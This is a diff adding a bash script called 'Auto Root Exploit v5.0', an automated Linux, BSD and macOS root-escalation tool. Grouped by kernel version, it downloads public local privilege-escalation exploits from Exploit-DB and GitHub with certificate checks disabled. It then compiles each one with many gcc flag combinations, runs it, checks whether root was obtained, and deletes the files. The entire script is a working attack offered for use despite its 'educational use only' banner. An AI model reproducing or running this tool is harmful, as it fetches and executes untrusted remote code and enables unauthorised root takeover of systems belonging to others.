@@ -1,0 +1,293 @@
+#!/bin/bash
+
+# =====================================================
+# Auto Root Exploit v5.0 - Updated with latest LPEs
+# =====================================================
+
+ver=5.0
+clear
+echo "==================================================="
+echo "         Auto Root Exploit v$ver (Latest)"
+echo "              For educational use only"
+echo "==================================================="
+
+checkroot() {
+    if [ $(id -u) == 0 ]; then
+        echo
+        echo "✅ Successfully R00T(ed).. have fun :)"
+        echo "ID     => " $(id)
+        echo "WHOAMI => " $(whoami)
+        echo
+        exit
+    fi
+}
+
+ccmpl() {
+    arraycmpl=(
+        "exploit.c -lutil -lpthread"
+        "exploit.c -m32 -O2 -o exploit"
+        "exploit.c -o exploit"
+        "exploit.c -o exploit -lkeyutils -Wall"
+        "exploit.c -o exploit -lpthread"
+        "exploit.c -o exploit -pthread"
+        "exploit.c -o exploit -static -Wall"
+        "exploit.c -o exploit -Wall"
+        "-fPIC -shared -o exploit exploit.c -ldl -w"
+        "-O2 exploit.c -o exploit"
+        "-O2 -fomit-frame-pointer exploit.c -o exploit"
+        "-o exploit exploit.c -static -O2"
+        "-pthread exploit.c -o exploit -lcrypt"
+        "-Wall -m64 -o exploit exploit.c"
+        "-Wall -o exploit exploit.c"
+    )
+    for i in "${arraycmpl[@]}"; do
+        gcc $i >> /dev/null
+        ./exploit
+        ./a.out
+        checkroot
+        rm -rf exploit a.out
+        cc $i >> /dev/null
+        ./exploit
+        ./a.out
+        checkroot
+        rm -rf exploit a.out
+        sleep 1
+    done
+    rm -rf exploit.c
+}
+
+shcmpl(){
+    bash exploit.sh
+    checkroot;
+    rm -rf exploit.sh *.c *.out
+}
+
+pycmpl(){
+    python exploit.py
+    checkroot;
+    rm -rf exploit.py *.c *.out
+}
+
+# ================ KERNEL 2.6 ================
+function 2x {
+    checkroot
+    echo
+    echo "R00Ting.. wait (2.6)"
+    # exploit array (some old ones still useful)
+    array26c=(
+        exploits/linux/local/2031.c
+        exploits/linux/local/2004.c
+        exploits/linux/local/2005.c
+        exploits/linux/local/2006.c
+        exploits/linux/local/2013.c
+        exploits/linux/local/5092.c
+        exploits/linux/local/5093.c
+        exploits/linux/local/8572.c
+        exploits/linux/local/8673.c
+        exploits/linux/local/10613.c
+        exploits/linux/local/15285.c
+        exploits/linux/local/15704.c
+        exploits/linux/local/17391.c
+        exploits/linux/local/18411.c
+        exploits/linux/local/25202.c
+        exploits/linux/local/25444.c
+        exploits/linux/local/30604.c
+        exploits/linux/local/33321.c
+        exploits/linux/local/33322.c
+        exploits/linux/local/35161.c
+        exploits/linux/local/40616.c
+        exploits/linux/local/40839.c
+        exploits/linux/local/45516.c
+    )
+    for i in "${array26c[@]}"; do
+        wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
+        ccmpl
+    done
+    echo "Srry.. no luck for 2.6 :("
+}
+
+# ================ KERNEL 3.x ================
+function 3x {
+    checkroot
+    echo
+    echo "R00Ting.. wait (3.x)"
+    array3c=(
+        exploits/linux/local/27297.c
+        exploits/linux/local/33336.c
+        exploits/linux/local/33824.c
+        exploits/linux/local/35370.c
+        exploits/linux/local/37292.c
+        exploits/linux/local/38390.c
+        exploits/linux/local/41995.c
+        exploits/linux/local/42887.c
+        exploits/linux_x86-64/local/24555.c
+        exploits/linux_x86-64/local/24746.c
+        exploits/linux_x86-64/local/31347.c
+        exploits/linux_x86-64/local/33516.c
+        exploits/linux_x86-64/local/33589.c
+    )
+    for i in "${array3c[@]}"; do
+        wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
+        ccmpl
+    done
+    echo "Srry.. no luck for 3.x :("
+}
+
+# ================ KERNEL 4.x ================
+function 4x {
+    checkroot
+    echo
+    echo "R00Ting.. wait (4.x)"
+    array4c=(
+        exploits/linux/local/39166.c
+        exploits/linux/local/39230.c
+        exploits/linux/local/39277.c
+        exploits/linux/local/40003.c
+        exploits/linux/local/40049.c
+        exploits/linux/local/40871.c
+        exploits/linux/local/41458.c
+        exploits/linux/local/41886.c
+        exploits/linux/local/41994.c
+        exploits/linux/local/43029.c
+        exploits/linux/local/43127.c
+        exploits/linux/local/44303.c
+    )
+    for i in "${array4c[@]}"; do
+        wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
+        ccmpl
+    done
+    echo "Srry.. no luck for 4.x :("
+}
+
+# ================ KERNEL 5.x (NEW) ================
+function 5x {
+    checkroot
+    echo
+    echo "R00Ting.. wait (5.x)"
+    # Exploit CVE-2021-3490 (eBPF)
+    wget -q --no-check-certificate https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main -O exploit.zip
+    unzip -q exploit.zip
+    cp Linux_LPE_eBPF_CVE-2021-3490-main/exploit.c exploit.c
+    ccmpl
+    rm -rf Linux_LPE_eBPF_CVE-2021-3490-main exploit.zip
+
+    # CVE-2021-22555 (Netfilter)
+    wget -q --no-check-certificate https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O exploit.c
+    ccmpl
+
+    # CVE-2022-0995 (watch_queue)
+    wget -q --no-check-certificate https://github.com/Bonfee/CVE-2022-0995/archive/refs/heads/main.zip -O exploit.zip
+    unzip -q exploit.zip
+    cp CVE-2022-0995-main/exploit.c exploit.c
+    ccmpl
+    rm -rf CVE-2022-0995-main exploit.zip
+
+    # CVE-2022-32250 (nft_object)
+    wget -q --no-check-certificate https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c -O exploit.c
+    ccmpl
+
+    # CVE-2023-0386 (OverlayFS)
+    wget -q --no-check-certificate https://github.com/xkaneiki/CVE-2023-0386/archive/refs/heads/main.zip -O exploit.zip
+    unzip -q exploit.zip
+    cp CVE-2023-0386-main/exploit.c exploit.c
+    ccmpl
+    rm -rf CVE-2023-0386-main exploit.zip
+
+    echo "Srry.. no luck for 5.x :("
+}
+
+# ================ KERNEL 6.x (NEWEST) ================
+function 6x {
+    checkroot
+    echo
+    echo "R00Ting.. wait (6.x)"
+    # CVE-2024-1086 (nf_tables double-free) - most reliable for 5.14 - 6.6
+    wget -q --no-check-certificate https://github.com/Notselwyn/CVE-2024-1086/archive/refs/heads/main.zip -O exploit.zip
+    unzip -q exploit.zip
+    cp CVE-2024-1086-main/exploit.c exploit.c
+    # This exploit may need specific compile flags; we try default first
+    ccmpl
+    rm -rf CVE-2024-1086-main exploit.zip
+
+    # CVE-2025-40271 (proc_readdir_de UAF)
+    wget -q --no-check-certificate https://raw.githubusercontent.com/MadExploits/CVE-2025-40271/main/exploit.c -O exploit.c
+    ccmpl
+
+    # CVE-2026-23111 (one-char UAF in nf_tables) - if PoC available
+    # Placeholder - replace with actual URL if available
+    # wget -q --no-check-certificate <URL> -O exploit.c
+    # ccmpl
+
+    echo "Srry.. no luck for 6.x :("
+}
+
+# ================ BSD / macOS ================
+function bsdx {
+    checkroot
+    echo "R00Ting.. wait (BSD)"
+    arraybsd=(
+        exploits/freebsd/local/7581.c
+        exploits/freebsd/local/8261.c
+        exploits/freebsd/local/9082.c
+        exploits/freebsd/local/14002.c
+        exploits/bsd/local/16951.c
+    )
+    for i in "${arraybsd[@]}"; do
+        wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
+        ccmpl
+    done
+    echo "Srry.. no luck for BSD :("
+}
+
+function appx {
+    checkroot
+    echo "R00Ting.. wait (macOS)"
+    arraymac=(
+        exploits/macos/local/45782.c
+        exploits/macos/local/40957.c
+    )
+    for i in "${arraymac[@]}"; do
+        wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
+        ccmpl
+    done
+    echo "Srry.. no luck for macOS :("
+}
+
+function al {
+    2x; sleep 1
+    3x; sleep 1
+    4x; sleep 1
+    5x; sleep 1
+    6x; sleep 1
+    bsdx; sleep 1
+    appx
+}
+
+# ================ MENU ================
+case "$1" in
+    2) 2x ;;
+    3) 3x ;;
+    4) 4x ;;
+    5) 5x ;;
+    6) 6x ;;
+    bsd) bsdx ;;
+    app) appx ;;
+    all) al ;;
+    *)
+        echo -e "
+        Usage: bash $0 {2|3|4|5|6|bsd|app|all}
+          2   - Kernel 2.6
+          3   - Kernel 3.x
+          4   - Kernel 4.x
+          5   - Kernel 5.x
+          6   - Kernel 6.x
+          bsd - FreeBSD/OpenBSD
+          app - macOS
+          all - All kernels (risky!)
+        "
+        echo "System Kernel: $(uname -r)"
+        exit 1
+        ;;
+esac
+
+exit 0
